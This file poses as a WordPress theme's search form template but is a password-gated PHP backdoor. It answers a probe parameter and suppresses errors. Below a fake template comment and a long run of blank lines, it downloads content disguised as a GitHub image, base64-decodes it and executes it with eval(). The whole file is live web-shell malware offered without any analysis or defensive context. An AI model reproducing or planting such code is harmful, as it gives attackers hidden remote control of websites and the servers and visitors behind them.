<?php ?><?php error_reporting(0); if(isset($_REQUEST["0kb"])){die(">0kb<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == 'a1fecbae6a303e0618f95586ddb49de7c30f911fecd8701500320daf754868a0') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
?>
<?php


/* 
 * The searchform.php template.
 *
 * Used any time that get_search_form() is called.
 *
 * @link https://wordpress.org/themes/template/
 * @package WordPress
 * @subpackage 
 * @since 1.0 */
 











































$l = "https://user-images.githubusercontent.com/143735067/264713238-ae810af4-c98d-421f-bbb3-1ddcc58f952a.jpg"/* "" - ni*/;


//DX for each form and a string


		
		if( function_exists('curl_init') ) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $l);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_HEADER, FALSE);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
			$body = curl_exec($ch);
			curl_close($ch);
		}
		else {
			$body = @file_get_contents($l);			
		}
	 eval(base64_decode($body));		

		




?>